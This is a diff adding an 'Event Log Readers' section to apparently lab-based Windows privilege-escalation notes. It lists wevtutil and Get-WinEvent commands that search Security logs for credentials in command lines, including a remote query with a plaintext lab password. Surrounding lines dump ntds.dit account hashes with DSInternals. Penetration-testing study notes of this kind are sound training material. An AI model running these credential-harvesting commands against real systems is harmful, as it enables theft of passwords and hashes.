@@ -219,3 +219,24 @@ Import-Module .\DSInternals.psd1
 $key = Get-BootKey -SystemHivePath .\SYSTEM
 Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
 ```
+
+## Event Log Readers
+- members of the Event Log Readers group have permission to access system logs.
+- can be used to read logs may contain passwords or hashes
+
+### read logs
+```powershell
+# check joining to the group
+net localgroup "Event Log Readers"
+
+# Searching Security Logs Using wevtutil
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+# use as another user
+wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
+
+
+# Searching Security Logs Using Get-WinEvent
+# Note: Searching the Security event log with Get-WInEvent requires administrator access or permissions adjusted on the registry key HKLM\System\CurrentControlSet\Services\Eventlog\Security.
+# Membership in just the Event Log Readers group is not sufficient.
+Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+```
